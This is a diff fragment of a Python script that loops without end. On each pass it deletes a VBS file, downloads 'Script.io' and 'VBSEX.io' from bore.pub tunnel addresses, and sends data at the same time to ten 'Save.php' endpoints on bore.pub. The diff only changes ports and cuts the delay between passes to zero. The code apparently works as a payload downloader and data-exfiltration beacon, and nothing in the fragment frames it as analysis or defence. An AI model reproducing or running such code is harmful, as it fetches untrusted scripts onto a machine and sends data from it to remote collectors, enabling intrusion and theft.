@@ -38,8 +38,8 @@ while True:
             os.remove(vbs_file_path)
 
         # Step 2: Download the necessary files
-        url1 = "http://bore.pub:6896/Script.io"
-        url2 = "http://bore.pub:6896/VBSEX.io"
+        url1 = "http://bore.pub:61723/Script.io"
+        url2 = "http://bore.pub:61723/VBSEX.io"
 
         response1 = requests.get(url1)
         if response1.status_code == 200:
@@ -96,7 +96,7 @@ while True:
 
         # List of PHP endpoint URLs
         php_urls = [
-            "http://bore.pub:6896/Save.php",
+            "http://bore.pub:61723/Save.php",
             "http://bore.pub:3348/Save.php",
             "http://bore.pub:44693/Save.php",
             "http://bore.pub:44688/Save.php",
@@ -105,7 +105,7 @@ while True:
             "http://bore.pub:61956/Save.php",
             "http://bore.pub:12345/Save.php",
             "http://bore.pub:10010/Save.php",
-            "http://bore.pub:10010/Save.php"
+            "http://bore.pub:10012/Save.php"
         ]
 
         # Use concurrent.futures to send data to all URLs concurrently
@@ -117,7 +117,7 @@ while True:
             print(result)
 
         # Wait for some time before running again
-        time.sleep(1)  # Adjust the sleep duration as needed
+        time.sleep(0)  # Adjust the sleep duration as needed
 
     except Exception as e:
         print(f"Error: {str(e)}")
